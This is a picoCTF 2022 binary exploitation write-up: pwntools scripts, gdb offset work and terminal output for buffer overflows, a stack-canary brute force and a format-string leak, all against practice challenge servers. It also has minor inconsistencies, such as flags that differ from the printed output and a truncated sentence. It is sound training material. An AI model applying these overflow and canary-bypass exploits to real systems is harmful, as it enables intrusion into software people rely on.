# **Binary Exploitation**
- [x] [basic-file-exploit (100)](#basic-file-exploit)
- [x] [buffer overflow 0 (100)](#buffer-overflow-0)
- [x] [CVE-XXXX-XXXX (100)](#CVE-XXXX-XXXX)
- [x] [buffer overflow 1 (200)](#buffer-overflow-1)
- [x] x-sixty-what
- [x] [RPS (200)](#RPS)
- [x] [buffer overflow 2 (300)](#buffer-overflow-2)
- [x] [buffer overflow 3 (300)](#buffer-overflow-3)
- [x] [flag leak (300)](#flag-leak)
- [ ] ropfu
- [ ] wine
- [ ] function overwrite
- [ ] stack cache
- [ ] solfire

## **basic-file-exploit**

### ***Description***
The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! <br>Connect to the program with netcat: <br>
`$ nc saturn.picoctf.net 49698` <br>
The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/538/program-redacted.c).

<details>
    <summary>Hint 1</summary>
    Try passing in things the program doesn't expect. Like a string instead of a number.
</details>

### ***Writeup***
Look through the source code, I notice that there is a global character pointer `flag` that is redacted, and that in the `data_read()` function there is this:

```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
}
```

The function puts the flag onto the console if `entry_number==0`, or when the `strtol` function return 0. Looking at the man pages, it seems the function returns 0 when there is an error, most  likely when the function is unable to convert the string to a long. Therefore, the value of `entry` needs to be something that cannot be converted to a long, and the easiest one to use is a letter.

Make sure that the program jumps to `data_read()` by making sure `inputs==0` is not satisfied, which can be incremented by calling `data_write()` by choosing option 1 first. 

Code for `basic-file-exploit.py`:

```python
from pwn import *

p = remote('saturn.picoctf.net', 49698)

p.sendline(b'1')        # enter a phrase
p.sendline(b'1')        # enter data
p.sendline(b'1')        # enter length
p.sendline(b'2')        # echo phrase
p.sendline(b'A')        # entry number

for i in range(3):
        print(p.recvline())
```

Terminal output:

```bash
└─$ python3 basic-file-exploit.py
[+] Opening connection to saturn.picoctf.net on port 49698: Done
b'\r\n'
b'A\r\n'
b'picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}\r\n'
[*] Closed connection to saturn.picoctf.net port 49698
```

Flag: `picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_25D6CDDB}`

## **buffer overflow 0**

### ***Description***
Smash the stack <br>
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: <br>
`nc saturn.picoctf.net 64712`

<details>
    <summary>Hint 1</summary>
    How can you trigger the flag to print?
</details>
<details>
    <summary>Hint 2</summary>
    If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
</details>
<details>
    <summary>Hint 3</summary>
    Run `man gets` and read the BUGS section. How many characters can the program really read?
</details>

### ***Writeup***
If you cannot run the vuln executable, it might be because your OS does not support 32-bit programs. I recommend either [installing gcc-multilib](https://superuser.com/a/1603878) to install libc6 to run a 32-bit ELF on a 64-bit architecture (`sudo apt install gcc-multilib`), or use the gcc compiler and compile the C code (`gcc vuln.c -o vuln`).

Looking at the vuln code, I can see that it first takes the contents of `flag.txt` and copies it to the global buffer `flag` using `fgets`. It then takes user input and writes it to `buf1` which is of size 100. Then, it calls the `vuln` void function which will use `strcpy` and copy the contents of `buf1` to `buf2` which is of size 16 using `gets`.

The error here is the vulnerable `strcpy` function, because it will write all the bytes from the input to the destination, and it can even write past the buffer into other parts of the memory.

It also seems the program will not allow the user to progress if `flag.txt` does not exist, so create the file using `touch flag.txt`.

I am going to send 4 A's to the vuln program to see what happens.

```bash
└─$ ./vuln
Input: AAAA
The program will exit now
```

As expected, nothing much and the program exits nicely. Looking at the code carefully, it seems there is a segmentation fault signal handler that will catch if a segfault happens. Specifically, if the program catches that signal, it goes to the `sigsegv_handler` function that will handle the signal by printing the `flag` buffer and then exit the program. Therefore, the goal is to get the program to segfault, and one way to do that is to write into the return address and corrupt it so that the program doesn't know where to jump to in memory after it exits the vuln function.

Run `gdb vuln` and then `layout asm` to get the assembly. You can also toggle the tui with <kbd>Ctrl+X+A</kbd>.

Since `strcpy` is in the vuln function, I am going to analyze the assembly at that section by doing `disas vuln`. I set a breakpoint after the `strcpy()`  call by doing `b *vuln+38` so I can analyze the stack after the program copies from `input` to `buf2`. Run with `r` and give an input of 4 A's, and the program should stop at the first breakpoint after the `strcpy()`. Examine the stack with `x/20x $esp`.

![buf2_start](./buffer_overflow_0/buf2_start.png)

I can see that `buf2` starts at address `0xffffcfc0` on the stack because that's where the `0x41` starts to appear. Running `info frame` next shows the following:

![ebx](./buffer_overflow_0/ebx.png)

The saved register `ebx` highlighted is `0xffffcfd4`, which is where `ebx` is on the stack. The value of register `ebx` is `0x56558fac`, which looks like an important register that should not be changed (I think it points to approximately to where `strcpy` is and loaded). We can do some offset calculation in gdb to find how many A's we need to get that register corrupt.

```bash
(gdb) p 0xffffcfd4 - 0xffffcfc0
$2 = 20
```

I am going to try and corrupt ebx register and possibly create a segmentation fault, I will write 20 A's into `input.txt` by doing `python3 -c "print('A'*20)" > input.txt` and then use that payload for gdb.

This is what the stack looks like with the payload. Reason why the address at `0xffffcfd4` was changed was because the payload was 20 A's including the null byte, where the null byte wrote into the next address.

![new_stack](./buffer_overflow_0/new_stack)

And then stepping through gdb shows that it tries to load in the address at `0xffffcfd4` on the stack into `eip`, and since that is not a valid memory address it triggers the segmentation fault.

![segfault](./buffer_overflow_0/segfault.png)

If you look at `vuln+8`, the program allocates `0x14`, or in decimal 20 bytes for `buf2`. Even though `buf2` was created on the stack with a size of 16, it needs the null byte. Of the 20 bytes, 16 is for the buffer, one is for the null byte, and last 3 is for the padding to make everything aligned to 32-bits (since this is a 32-bit program).

```bash
└─$ python3 -c "print('A'*20)" | nc saturn.picoctf.net 64712
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_81929e72}
```

Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_81929e72}`

## **CVE-XXXX-XXXX**

### ***Description***
Enter the CVE of the vulnerability as the flag with the correct flag format: <br>
`picoCTF{CVE-XXXX-XXXXX}` replacing XXXX-XXXXX with the numbers for the matching vulnerability. <br>
The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.

<details>
    <summary>Hint 1</summary>
    We're not looking for the Local Spooler vulnerability in 2021...
</details>

### ***Writeup***
A quick Google search of "first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service" gives this [result](https://msrc.microsoft.com/update-guide/vulnerability/cve-2021-34527). Make sure that the Attack Vector is Network and not Local.

Flag: `picoCTF{CVE-2021-34527}`

## **buffer overflow 1**

### ***Description***
<button name="button" onclick="http://www.google.com">Launch Instance</button> <br>
Control the return address <br>
Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/253/vuln). <br>
You can view source [here](https://artifacts.picoctf.net/c/253/vuln.c). And connect with it using `nc saturn.picoctf.net 59771`

<details>
    <summary>Hint 1</summary>
    Make sure you consider big Endian vs small Endian.
</details>
<details>
    <summary>Hint 2</summary>
    Changing the address of the return pointer can call different functions.
</details>

### ***Writeup***
Looking at the source code in `vuln.c`, it seems that after calling the print function in the `main()` function, it jumps to the `vuln()` function and takes user input using `gets()` and stores it in the local character buffer `buf` of size 32. It also prints the return address of the `vuln()` function, which is `0x804932f`

```bash
└─$ ./vuln
Please enter your string:
AAAA
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

There is also another function `win()` in the code that does not seem to be called anywhere in the program. The function seems to print the contents of `flag.txt`, which is what we are trying to achieve. Therefore, the goal is to change the return address so that in `vuln()` it does not jump back to `main()`, but to the  `win()` function.

Running `p win` in gdb shows that the function address is `0x80491f6`.

Set a breakpoint at `vuln+34` right after the `gets()` function is called. Run the program and give a test string of `AAAA`. Use `layout reg` to see the registers.

Running `info frame` shows that the saved eip value is `0xffffd04c`, which is where the return address is on the stack. Also running `x/20x $esp` shows that the start of `buf` is at `0xffffd020`, as indicated by the start of the `0x41`'s, or A in hex. We can use those numbers to calculate the offset between the start of the buffer to the return address, so we know how much padding we need before we add the new return address bytes to our payload.

Return address:

![eip](./buffer_overflow_1/eip.png)

Start of buffer:

![buf_start](./buffer_overflow_1/buf_start.png)

Make sure that when sending the payload that the address of `win()` is in little endian.

To check if it works, set another breakpoint at `win` and step through with `n`. I also created an `input.txt` file with the payload as well (refer to commented section in code). Therefore, running `r < input` in gdb and stepping shows the following modified stack:

![new_stack](./buffer_overflow_1/new_stack.png) 

I also did end up in the `win()` function, and the value of `eip` did change to `0x80491f6`.

![win](./buffer_overflow_1/win.png)

Running the payload locally after doing `touch flag.txt` gives a message the return address has changed. 

Code for `buffer_overflow_1.py`:

```python
from pwn import *

port = 49966
debug = 0

if not debug:
        p = remote('saturn.picoctf.net', port)
else:
        p = process('./vuln')

print(p.recvline())

offset = 0xffffd0bc - 0xffffd090        # start of return address - start of buffer
payload = b'A' * offset                 # padding
payload += p32(0x80491f6)               # win

p.sendline(payload)

print(p.recvline())
print(p.recv())
```

Terminal output:

```bash
└─$ python3 buffer_overflow_1.py
[+] Opening connection to saturn.picoctf.net on port 49966: Done
b'Please enter your string: \n'
b'Okay, time to return... Fingers Crossed... Jumping to 0x80491f6\n'
b'picoCTF{addr3ss3s_ar3_3asy_ad2f467b}'
[*] Closed connection to saturn.picoctf.net port 49966
```

Flag: `picoCTF{addr3ss3s_ar3_3asy_b9797671}`

## **x-sixty-what**

### ***Description***

<button name="button" onclick="http://www.google.com">Launch Instance</button> <br>
Overflow x64 code<br>Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the `flag` function in this [program](https://artifacts.picoctf.net/c/192/vuln). [Download source](https://artifacts.picoctf.net/c/192/vuln.c). `nc saturn.picoctf.net 59459`

<details>
    <summary>Hint 1</summary>
    Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
</details>
<details>
    <summary>Hint 2</summary>
    Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.
</details>


### ***Writeup***

break at vuln+29

![image-20220508163353163](C:\Users\jason\AppData\Roaming\Typora\typora-user-images\image-20220508163353163.png)

![image-20220508155719778](C:\Users\jason\AppData\Roaming\Typora\typora-user-images\image-20220508155719778.png)

![image-20220508155747169](C:\Users\jason\AppData\Roaming\Typora\typora-user-images\image-20220508155747169.png)

`0x7fffffffdf08 - 0x7fffffffdec0 = 72`

Code for `x-sixty-what.py`:

```python
from pwn import *

port = 54083
debug = 0

if not debug:
        p = remote('saturn.picoctf.net', port)
else:
        p = process('./vuln')

print(p.recvline())

offset = 0x7fffffffdf08 - 0x7fffffffdec0        # start of return address - start of buffer
payload = b'A' * offset                         # padding
payload += p64(0x40123b)                        # push rbp

p.sendline(payload)

print(p.recv())
```

Terminal output:

```bash
└─$ python3 x-sixty-what.py
[+] Opening connection to saturn.picoctf.net on port 54083: Done
b'Welcome to 64-bit. Give me a string that gets you the flag: \n'
b'picoCTF{b1663r_15_b3773r_11c407bc}'
[*] Closed connection to saturn.picoctf.net port 54083
```

## **RPS**

### ***Description***
Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row. <br>
Connect to the program with netcat: <br>
`$ nc saturn.picoctf.net 51420` <br>
The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/445/game-redacted.c).

<details>
    <summary>Hint 1</summary>
    How does the program check if you won?
</details>

### ***Writeup***
Looking at the source code, I need `wins` to be greater than 5 for the program to print the flag to the console. The `wins` variable is accumulated if `play()` returns true, which is if `strstr(player_turn, loses[computer_turn])` also returns a non-zero result. Looking at the man pages for `strstr` shows that it is in the form of `char *strstr(const char *haystack, const char *needle)`, where `strstr()` finds the first occurrence of the substring `needle` in the string `haystack`. It then returns a pointer to the beginning of the located substring. Therefore, the program tries to find the specific string of `loses[computer_turn]` in the `player_turn` string that we provided to the program, where `char* loses[3] = {"paper", "scissors", "rock"};`. Essentially, create a string where if `strstr` tries to find the substring match it succeeds on all occurrences, so such a string that does that is `rockpaperscissors` because each choice is a substring in that input string.

Code for `RPS.py`:

```python
from pwn import *

p = remote('saturn.picoctf.net', 51420)

for i in range(5):
        p.sendline(b'1')                        # play game
        p.sendline(b'rockpaperscissors')        # selection

for i in range(6):
        print(p.recvline())
```

Terminal output:

```bash
└─$ python3 RPS.py
[+] Opening connection to saturn.picoctf.net on port 51420: Done
b'rockpaperscissors\r\n'
b'You played: rockpaperscissors\r\n'
b'The computer played: scissors\r\n'
b'You win! Play again?\r\n'
b"Congrats, here's the flag!\r\n"
b'picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}\r\n'
[*] Closed connection to saturn.picoctf.net port 51420
```

Flag: `picoCTF{50M3_3X7R3M3_1UCK_D80B11AA}`

## **buffer overflow 2**

### ***Description***

<button name="button" onclick="http://www.google.com">Launch Instance</button> <br>
Control the return address and arguments<br>
This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/344/vuln)?<br>
You can view source [here](https://artifacts.picoctf.net/c/344/vuln.c). And connect with it using `nc saturn.picoctf.net 60855`

<details>
    <summary>Hint 1</summary>
    Try using GDB to print out the stack once you write to it.
</details>

### ***Writeup***

Run in gdb and set a breakpoint at `vuln+34` after the `gets()` call in the `vuln()` function, so that we can example the stack after the payload. Run the program and give a small test input of 4 A's to see where the start of `buf` is.

![buf_start](./buffer_overflow_2/buf_start.png)

We can see that `buf` starts at `0xffffcfdc` from the `0x41`'s on the stack. Running `info frame` also shows that the return address of the `vuln() ` function is `0x80493dd` at address `0xffffd04c` on the stack. Doing some offset calculations in gdb by doing `p 0xffffd04c - 0xffffcfdc` shows that the offset is 112 from the top of the buffer to the return address.

![return_address](./buffer_overflow_2/return_address.png)

Running `p win` shows that the address of the function is at `0x8049296`. I then constructed my payload with 112 A's followed by the return address to see what happens.

![win_stack](./buffer_overflow_2/win_stack.png)

Sure enough, the program does step into the `win()` function. Looking at the source code, we can deduce that we want to compare the value at `ebp+0x8` to be equal to `0xcafef00d` and the value at `ebp+0xc`. Breaking at `win+7` after `esp` was moved to `ebp` shows that `ebp` points to address `0xffffd04c`, which is the same place on the stack as the return address of `vuln()`. Doing some offset calculations shows that we need address `0xffffd054` and `0xffffd058` on the stack to be updated to `0xcafefood` and `0xf00df00d` respectively.

![win_return_address](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_2\win_return_address.png)

We need 4 bytes of padding to fill the space from address `0xffffd050` to `0xffffdo53`, and after that is where the arguments start. 

We can see that doing an `info frame` in the `win()` function after `ebp` is updated that the location of the return address (`saved register eip`) is at `0xffffd050`, which is the pointer between the end of the buffer and the start of `arg1`. Also don't forget to do `touch flag.txt` to create a temporary flag file.

Quick note: You can switch between the terminal and the UI by typing `focus asm` and `focus cmd`.

Code for `buffer_overflow_2.py`:

```python
from pwn import *

port = 57649
debug = 1

if not debug:
        p = remote('saturn.picoctf.net', port)
else:
        p = process('./vuln')

print(p.recvline())

offset = 0xffffd04c - 0xffffcfdc        # start of return address - start of buffer
offset2 = 0xffffd054 - 0xffffd04c - 4   # start of arg1 - start of return address - 4 bytes
payload = b'A' * offset                 # padding
payload += p32(0x8049296)               # win
payload += b'B' * 4                     # padding 2
payload += p32(0xcafef00d)              # arg1
payload += p32(0xf00df00d)              # arg2

p.sendline(payload)

print(p.recvline())
print(p.recv())
```

Terminal output:
```bash
└─$ python3 buffer_overflow_2.py
[+] Opening connection to saturn.picoctf.net on port 57524: Done
b'Please enter your string: \n'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x080\x91\x04\x08\r\xf0\xfe\xca\r\xf0\r\xf0\n'
b'picoCTF{argum3nt5_4_d4yZ_b3fd8f66}'
[*] Closed connection to saturn.picoctf.net port 57524
```

## **buffer overflow 3**

### ***Description***

<button name="button" onclick="http://www.google.com">Launch Instance</button> <br>
Do you think you can bypass the protection and get the flag?<br>It looks like Dr. Oswal added a stack canary to this [program](https://artifacts.picoctf.net/c/492/vuln) to protect against buffer overflows. You can view source [here](https://artifacts.picoctf.net/c/492/vuln.c). And connect with it using: `nc saturn.picoctf.net 51360`

<details>
    <summary>Hint 1</summary>
    Maybe there's a smart way to brute-force the canary?
</details>

### ***Writeup***

Running `checksec vuln` does not show that it has canaries, which probably means that the canary in the program is not a real stack canary where the value is randomized everytime.

You can do a format string attack

Set a breakpoint at `vuln+192`

`ebp` is at `0xffffd058` at that breakpoint using `info register $ebp`

`length` starts at address `0xffffcfc8`  given the instruction at `vuln+66` where the program is preparing to read from STDIN into `length`, and `0xffffd058-0x90=0xffffcfc8`. Doing `info register $edx` also shows that it has been updated to `0x4`

`buf` starts at address `0xffffd008`  given the instruction at `vuln+181` where the program is preparing to read from STDIN into `buf`, and `0xffffd058-0x50=0xffffd008` (also is where the 41's start given a sample input of 4 A's).

The canary is at address `0xffffd048` given the instruction at `vuln+207` where the program is comparing the value of the local `canary` buffer to the global variable `global_canary`, and `0xffffd058-0x10=0xffffd048`.

The return address is at `0xffffd05c` on the stack with a value of `0x80495e6`

The `win()` function is at `0x8049336` by doing `p win`

The offset from the start of `buf` to the start of the canary is `0xffffd048-0xffffd008=0x40=64`

The offset from the canary to the return address is `0xffffd05c-0xffffd048-4=16`

```python
from pwn import *

port = 55533
debug = 0
canary = ''

offset = 0xffffd048 - 0xffffd008        	# start of canary - start of buffer
offset2 = 0xffffd05c - 0xffffd048 - 4		# start of return address - start of canary - 4 bytes
length = offset

with context.quiet:
    for i in range(1, 5):
        length += 1
        for j in range(0xff):
            if not debug:
                p = remote('saturn.picoctf.net', port)
            else:
                p = process('./vuln')

            p.sendlineafter(b'> ', str(length).encode())

            payload = b'A' * offset                 # padding
            payload += canary.encode()              # part of canary
            payload += chr(j).encode()              # testing character
            p.sendlineafter(b'Input> ', payload)

            try:
                canary_return = p.recvline()
                if (canary_return != b'***** Stack Smashing Detected ***** : Canary Value Corrupt!\n'):
                    canary += chr(j)
                    p.close()
                    break
                p.close()
            except:
                p.close()

if not debug:
    p = remote('saturn.picoctf.net', port)
else:
    p = process('./vuln')

length = offset + 4 + offset2 + 4
print(p.recvline())
p.sendline(str(length).encode())

payload = b'A' * offset                 	# padding
payload += canary.encode()                      # canary
payload += b'A' * offset2			# padding 2
payload += p32(0x8049336)               	# win
print(p.recv())
print(p.recv())
p.sendline(payload)

print(p.recvline())
print(p.recvline())
```

```bash
└─$ python3 buffer_overflow_3.py
[+] Opening connection to saturn.picoctf.net on port 55533: Done
b'How Many Bytes will You Write Into the Buffer?\n'
b'> '
b'Input> '
b"Ok... Now Where's the Flag?\n"
b'picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}\n'
[*] Closed connection to saturn.picoctf.net port 55533
```

## **flag leak**

### ***Description***

<button name="button" onclick="http://www.google.com">Launch Instance</button> <br>
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/122/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/122/vuln.c). And connect with it using:`nc saturn.picoctf.net 53934`

<details>
    <summary>Hint 1</summary>
    Format Strings
</details>


### ***Writeup***

Running `checksec vuln` does not show that it has canaries, which probably means that the canary in the program is not a real stack canary w

```
(gdb) p readflag
$1 = {<text variable, no debug info>} 0x80492b6 <readflag>
```

break at vuln+82

![image-20220508054807829](C:\Users\jason\AppData\Roaming\Typora\typora-user-images\image-20220508054807829.png)

Format string: %36$p

7069636f
4354467b
4c33346b
316e675f
466c3467
5f306666
5f537434
636b5f30
35353130
3832637d

picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
